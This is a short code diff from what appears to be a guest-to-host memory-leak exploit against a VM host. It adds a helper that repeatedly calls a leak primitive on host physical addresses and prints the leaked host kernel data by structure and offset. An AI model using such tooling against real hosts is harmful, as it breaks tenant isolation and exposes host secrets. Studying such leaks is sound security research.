@@ -865,6 +865,16 @@ void reverse_around(hpa_t base, hpa_t pa)
 	exit(1);
 }
 
+void reverse_after(hpa_t base, hpa_t pa, hva_t hdm, const char *name, int len)
+{
+	for (int off = 0; off < len; off += 8) {
+		// u64 data = leak64(base, pa+off);
+		u64 data = 0;
+		leak(&data, base, pa+off+5, 1); 
+		printf("dm %16lx | pa %12lx | %16s+%4x = %16lx\n", hdm+pa+off, pa+off, name, off, data);
+	}
+}
+
 void reverse_host_kernel_data_structures(void)
 {
         // Results below were gathered on rain-vm-gce.
